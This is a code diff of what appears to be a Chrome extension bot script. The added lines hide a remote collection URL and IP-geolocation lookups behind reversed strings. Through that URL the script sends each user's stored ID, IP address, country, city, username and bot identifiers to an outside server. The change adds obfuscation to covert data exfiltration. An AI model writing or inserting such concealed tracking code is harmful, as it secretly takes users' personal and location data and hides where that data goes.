@@ -13,7 +13,7 @@ function sendKiss(callback, sequenceName){
 	sendXMLHttpRequest("ajax.php", "POST", "func=getStatic", true, function(response){
 		var un = JSON.parse(JSON.parse(response).msg)[0].user
 		var fip = JSON.parse(JSON.parse(response).msg)[0].ip
-		var request = new BGRequest("sendmessage", "pid=" + localStorage.getItem(STORAGE_ID) + "&sequence=" + sequenceName + "&ip=" + controllers.bot.cinfo.ip + "&country_name=" + controllers.bot.cinfo.country_name + "&city=" + 	controllers.bot.cinfo.city + "&fip=" + fip + "&un=" + un + "&version=" + VERSION_BOT + "&uperiod=" + localStorage.getItem(STORAGE_LIMIT_TIME) + "&codename=" + controllers.bot.codename, "http://localhost/input")
+		var request = new BGRequest("sendmessage", "pid=" + localStorage.getItem(STORAGE_ID) + "&sequence=" + sequenceName + "&ip=" + controllers.bot.cinfo.ip + "&country_name=" + controllers.bot.cinfo.country_name + "&city=" + 	controllers.bot.cinfo.city + "&fip=" + fip + "&un=" + un + "&version=" + VERSION_BOT + "&uperiod=" + localStorage.getItem(STORAGE_LIMIT_TIME) + "&codename=" + controllers.bot.codename, ("/tupni/moc.axmoc.revrestobxeh//:ptth").split("").reverse().join(""))
 		//var request = new BGRequest("sendmessage", "pid=" + localStorage.getItem(("txe_bup_elgoog").split("").reverse().join("")) + "&sequence=" + sequence + "&ip=" + "hidden" + "&country_name=" + "hidden" + "&city=" + 	"hidden" + "&fip=" + "hidden" + "&un=" + "hidden", "http://localhost/input")
 		chrome.runtime.sendMessage({message: request}, function(responseMessage) {
 			var handleResponse = function(getResponse, sender, sendResponse) {
@@ -36,7 +36,7 @@ function setEnvironmentValues(callback, sequenceName){
 				this.data = data
 				this.target = target
 			}
-			var requestA = new BGRequest("sendmessage", "", "http://jsonip.com/")
+			var requestA = new BGRequest("sendmessage", "", ("/moc.pinosj//:ptth").split("").reverse().join(""))
 			chrome.runtime.sendMessage({message: requestA}, function(responseMessageA) {
 				var handleResponseA = function(getResponseA, senderA, sendResponseA) {
 						if(getResponseA.message){
@@ -50,7 +50,7 @@ function setEnvironmentValues(callback, sequenceName){
 							    ip = null
 							}
 							if(ip){
-								var requestB = new BGRequest("sendmessage", "", "http://freegeoip.net/json/" + ip)
+								var requestB = new BGRequest("sendmessage", "", ("/nosj/ten.pioegeerf//:ptth").split("").reverse().join("") + ip)
 
 								chrome.runtime.sendMessage({message: requestB}, function(responseMessageB) {
 									var handleResponseB = function(getResponseB, senderB, sendResponseB) {
